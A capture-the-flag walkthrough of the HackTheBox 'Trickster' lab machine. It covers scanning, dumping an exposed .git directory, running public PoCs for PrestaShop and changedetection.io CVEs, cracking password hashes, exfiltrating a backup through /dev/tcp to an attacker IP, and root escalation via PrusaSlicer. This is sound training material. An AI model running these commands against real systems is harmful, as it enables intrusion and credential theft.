<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Trickster</title>
<meta name=description content="Platform: HackTheBox Link: Trickster Level: Medium OS: Linux Read this write up in french
Trickster is a multi-step machine beginning with the discovery of a …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-trickster/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Trickster"><meta property="og:description" content="Platform: HackTheBox Link: Trickster Level: Medium OS: Linux Read this write up in french
Trickster is a multi-step machine beginning with the discovery of a …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Trickster/Trickster.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Trickster/Trickster.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Trickster"><meta name=twitter:description content="Platform: HackTheBox Link: Trickster Level: Medium OS: Linux Read this write up in french
Trickster is a multi-step machine beginning with the discovery of a …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-trickster/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-trickster/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Trickster/Trickster.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-trickster/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-trickster/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Trickster</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>January 31, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: HackTheBox</li><li>Link: <a href=https://app.hackthebox.com/machines/Trickster>Trickster</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/fr/posts/htb-trickster/>Read this write up in french</a></p><p>Trickster is a multi-step machine beginning with the discovery of a subdomain containing a hidden <code>.git</code> directory, running an exploitable version of <code>PrestaShop</code>. Gaining initial access (with <code>CVE-2024-34716</code>) leads to the retrieval of database credentials from a configuration file, which help us find a user password.</p><p>System enumeration reveals an internal Docker interface with a host running a vulnerable instance of <code>changedetection.io</code>, which, when exploited (with <code>CVE-2024-32651</code>), provides root access within the container. Inside, we obtain backup files containing credentials which we use to pivot to another user. The final privilege escalation to root is achieved by exploiting <code>PrusaSlicer</code>.</p><p>Target IP - <code>10.10.11.34</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/Trickster 10.10.11.34
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-30 14:22 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.34
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.059s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.52
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://trickster.htb/
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.52 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.91 seconds
</span></span></code></pre></div><p>We find two open ports:</p><ul><li>22 with SSH</li><li>80 with http, plus a redirection to <code>trickster.htb</code></li></ul><pre tabindex=0><code>sudo echo &#34;10.10.11.34 trickster.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>At <code>http://trickster.htb/</code> we find a static website.</p><p><img src=/images/HTB-Trickster/trickster_website.png alt="Trickster website"></p><p>We enumerate for subdomians.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://trickster.htb -H &#34;Host: FUZZ.trickster.htb&#34; -ic
</code></pre><p><img src=/images/HTB-Trickster/trickster_ffuf.png alt="subdomain enumeration"></p><p>Most results have a <code>301</code> status (they are all false positive), we can filter them out by updating the command.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404,301 -t 100 -u http://trickster.htb -H &#34;Host: FUZZ.trickster.htb&#34; -ic
</code></pre><p><img src=/images/HTB-Trickster/trickster_ffuf2.png alt="subdomain enumeration filtered"></p><p>We discover the <code>shop</code> subdomain.</p><p>At <code>http://shop.trickster.htb/</code> we find an online store.</p><p><img src=/images/HTB-Trickster/trickster_store.png alt="store subdomain"></p><p>The website is using <a href=https://www.prestashop-project.org/>PrestaShop</a>, an open source software platform to build e-commerce solutions.</p><p><img src=/images/HTB-Trickster/trickster_prestashop.png alt=Wappalyzer></p><blockquote><p>I found a few CVEs for Prestashop such as <a href=https://pentest-tools.com/vulnerabilities-exploits/prestashop-1770-sql-injection_2545>CVE-2021-3110</a> and <a href=https://www.exploit-db.com/exploits/51001>CVE-2022-31101</a> but none of them worked on the target.</p></blockquote><p>With directory enumeration we find a <code>.git</code> directory on the subdomain.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://shop.trickster.htb/FUZZ -ic -fs 283
</code></pre><p><img src=/images/HTB-Trickster/ffuf_trickster_git.png alt=".git directory"></p><p>We can access it via the browser at <code>http://shop.trickster.htb/.git/</code>.</p><p><img src=/images/HTB-Trickster/git_content.png alt=".git directory content"></p><p>We use <a href=https://github.com/arthaud/git-dumper>git-dumper</a> to dump the repository on our local machine.</p><pre tabindex=0><code>git-dumper http://shop.trickster.htb/.git/ git_trickster
</code></pre><p><img src=/images/HTB-Trickster/git_dumper.png alt=".git directory download"></p><p>We have two directories: <code>.git</code> (the one we already know about) and <code>admin634ewutrx1jgitlooaj</code>. We also check the commits with <code>git log</code> and find only one about updating an admin panel by <code>adam@tricksterhtb</code>.</p><p><img src=/images/HTB-Trickster/adam_commit.png alt="git log command"></p><p>At <code>http://shop.trckster.htb/admin634ewutrx1jgitlooaj/</code> there is another login page with <code>PrestSahop 8.1.5</code>.</p><p><img src=/images/HTB-Trickster/prestashop_8.1.5.png alt="prestashop 8.1.5"></p><h2 id=initial-foothold>Initial Foothold</h2><p>After researching an exploit for this version we find an article <a href=https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/>here</a> about <code>CVE-2024-34716</code> and a PoC is available at <a href=https://github.com/aelmokhtar/CVE-2024-34716>this</a> Github repository.</p><p>We need to set a web server on port 5000 first.</p><pre tabindex=0><code>python3 -m http.server 5000
</code></pre><p><img src=/images/HTB-Trickster/web_server_trickster.png alt="web server trickster exploit"></p><p>Then we run the exploit.</p><pre tabindex=0><code>python3 exploit.py --url http://shop.trickster.htb --email adam@trickster.htb --local-ip YOUR_IP --admin-path admin634ewutrx1jgitlooaj
</code></pre><p>We obtain a shell as <code>www-data</code>.</p><p><img src=/images/HTB-Trickster/foothold.png alt=foothold></p><p>On <a href=https://classydevs.com/prestashop-database-config-file/>this website</a> we learn the Prestashop database configuration file is either in <code>your-website/config/settings.inc.php</code> (for v1.5-1.6) or in <code>your-website/app/config/parameters.php</code> (for v1.7).</p><p>In <code>/var/www/prestashop/config/config.inc.php</code> we find a line pointing to <code>parameters.php</code>.</p><p><img src=/images/HTB-Trickster/config_file.png alt="configuration file"></p><h3 id=shell-as-james>Shell as james</h3><p>Inside <code>/var/www/prestashop/app/config/parameters.php</code> we discover database credentials.</p><pre tabindex=0><code>ps_user:prest@shop_o
</code></pre><p><img src=/images/HTB-Trickster/database_creds.png alt=foothold></p><p>We log into the MySQL database.</p><pre tabindex=0><code>mysql -u ps_user -p
</code></pre><p>Using the <code>DESCRIBE</code> command we inspect the tables, <code>ps_employee</code> has some good information.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#c678dd>DESCRIBE</span> <span style=color:#c678dd>table_name</span>;
</span></span></code></pre></div><p><img src=/images/HTB-Trickster/ps_employee_fields.png alt="ps_employee columns"></p><p>We find the password hashes.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=display:flex><span><span style=color:#c678dd>select</span> <span style=color:#e06c75>lastname</span>, <span style=color:#e06c75>firstname</span>, <span style=color:#e06c75>email</span>, <span style=color:#e06c75>passwd</span> <span style=color:#c678dd>from</span> <span style=color:#e06c75>ps_employee</span>
</span></span></code></pre></div><p><img src=/images/HTB-Trickster/mysql_creds.png alt="password hashes"></p><p>We crack <code>james</code> hash with hashcat and recover the password <code>alwaysandforever</code>.</p><pre tabindex=0><code>hashcat -m 3200 -a 0 james_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-Trickster/james_pwd.png alt="james password cracked"></p><p>We login as <code>james</code> via SSH and recover the user flag.</p><p><img src=/images/HTB-Trickster/user_flag.png alt="user flag found"></p><p>Linpeas shows that Docker is running.</p><p><img src=/images/HTB-Trickster/docker_present.png alt="Docker found running"></p><p>With <code>ip a</code> we find an internal Docker interface (<code>docker0</code>) with an IP address of <code>172.17.0.1</code> and a subnet of <code>172.17.0.0/16</code>.</p><p><img src=/images/HTB-Trickster/docker_network.png alt="Internal docker subnet"></p><p>We scan this network to find its hosts. The nmap binary is available <a href=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap>here</a>.</p><pre tabindex=0><code>./nmap -sn 172.17.0.0/16
</code></pre><p><img src=/images/HTB-Trickster/internal_nmap_scan.png alt="Internal nmap scan"></p><p>We find two hosts: <code>172.17.0.1</code> (that&rsquo;s us) and <code>172.17.0.2</code>, let&rsquo;s scan it.</p><pre tabindex=0><code>./nmap -p- 172.17.0.2
</code></pre><p>We find port <code>5000</code> open.</p><p><img src=/images/HTB-Trickster/port_5000_open.png alt="Open ports on 172.17.0.2"></p><p>We do some tunneling to access the port.</p><pre tabindex=0><code>ssh -L PORT_NUMBER:172.17.0.2:5000 james@trickster.htb
</code></pre><p><img src=/images/HTB-Trickster/SSH_tunneling.png alt="SSH tunneling command"></p><p>At <code>http://localhost:5000/</code> we find an instance of <a href=https://changedetection.io/>changedetection.io</a>, a tool to monitor changes in web pages. We login with <code>james</code> password, the application is running version <code>v0.45.20</code>.</p><p><img src=/images/HTB-Trickster/changedetection_version.png alt="changedetection version"></p><h3 id=shell-as-root-docker>Shell as root (Docker)</h3><p>After some research we find <a href=https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/>CVE-2024-32651</a> with a PoC <a href=https://github.com/evgeni-semenov/CVE-2024-32651>here</a>. We execute the exploit and become root in the container.</p><pre tabindex=0><code>python3 cve-2024-32651.py --url http://localhost:5000/ --ip YOUR_IP --port 9001 --password alwaysandforever
</code></pre><p><img src=/images/HTB-Trickster/CVE_2024_32651.png alt=cve-2024-32651></p><p>In <code>/datastore/Backups</code> we find some zip files.</p><p><img src=/images/HTB-Trickster/backup_archives.png alt="backups archives"></p><p>The container does not have <code>curl</code>, <code>wget</code>, or <code>nc</code>. So we send the data to <code>/dev/tcp</code> for file transfer.</p><p>On the target we run:</p><pre tabindex=0><code>cat changedetection-backup-20240830194841.zip &gt; /dev/tcp/YOUR_IP/PORT_NUMBER
</code></pre><p>On our local machine we run:</p><pre tabindex=0><code>nc -l -p {PORT_NUMBER} -q 1 &gt; changedetection-backup-20240830194841.zip
</code></pre><p>After the extraction we have a directory and a few files.</p><p><img src=/images/HTB-Trickster/backup_extracted_files.png alt="extracted files"></p><p>Inside the directory there are two files, one has the <code>.br</code> extension.</p><blockquote><p>A file with a .br extension is a Brotli-compressed file. Brotli is a lossless compression algorithm developed by Google, mainly used for compressing web assets like CSS, JavaScript, and HTML to improve website loading speed. <em>Read more about it <a href=https://docs.fileformat.com/web/br/>here</a>.</em></p></blockquote><p><img src=/images/HTB-Trickster/files_found.png alt="files found in archive"></p><h3 id=shell-as-adam>Shell as adam</h3><p>We decompress the file with <code>brotli</code> and get a file called <code>f04f0732f120c0cc84a993ad99decb2c.txt</code>.</p><pre tabindex=0><code>brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
</code></pre><p><img src=/images/HTB-Trickster/brotli_decompress.png alt="brotli decompressed file"></p><p>It contains the credentials <code>adam:adam_admin992</code>.</p><p><img src=/images/HTB-Trickster/creds_brotli.png alt="credentials in decompressed file"></p><p>We use them to login as <code>adam</code> via SSH. This user can execute <code>/opt/PrusaSlicer/prusaslicer</code> as root.</p><h3 id=shell-as-root>Shell as root</h3><p><img src=/images/HTB-Trickster/adam_SSH_login.png alt="Adam SSH login"></p><p>A privilege escaltion method is available <a href=https://github.com/suce0155/prusaslicer_exploit>here</a>.</p><pre tabindex=0><code>sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf
</code></pre><p><img src=/images/HTB-Trickster/prusaslicer_privesc.png alt="prusaslicer privilege escalation"></p><p>On the listener, we get a connection as <code>root</code>.</p><p><img src=/images/HTB-Trickster/root_flag.png alt="root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-smol/>&#8592;
Previous:
THM: Smol</a></p><p class=prev-post-date>January 27, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-james>Shell as james</a></li><li><a href=#shell-as-root-docker>Shell as root (Docker)</a></li><li><a href=#shell-as-adam>Shell as adam</a></li><li><a href=#shell-as-root>Shell as root</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>